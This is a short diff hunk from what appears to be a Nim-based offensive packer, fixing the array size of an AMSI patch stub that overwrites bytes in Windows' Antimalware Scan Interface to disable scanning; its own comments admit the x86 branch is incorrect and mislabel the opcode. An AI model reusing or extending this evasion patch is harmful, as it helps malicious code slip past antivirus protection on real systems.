@@ -2155,9 +2155,9 @@ let AMSIPatchStub * = """
             disabled: bool = false
         
         when defined amd64:
-            let patch: array[1, byte] = [byte 0x29, 0xFF] # Patch to JNZ, old value was 0x74 (JNZ)
+            let patch: array[2, byte] = [byte 0x29, 0xFF] # Patch to JNZ, old value was 0x74 (JNZ)
         elif defined i386:
-            let patch: array[1, byte] = [byte 0x29, 0xFF] # This is not correct but x86 wont really work in the Packer anyway here.
+            let patch: array[2, byte] = [byte 0x29, 0xFF] # This is not correct but x86 wont really work in the Packer anyway here.
         
         var ModuleFileName: UNICODE_STRING
         when defined(DInvoke):
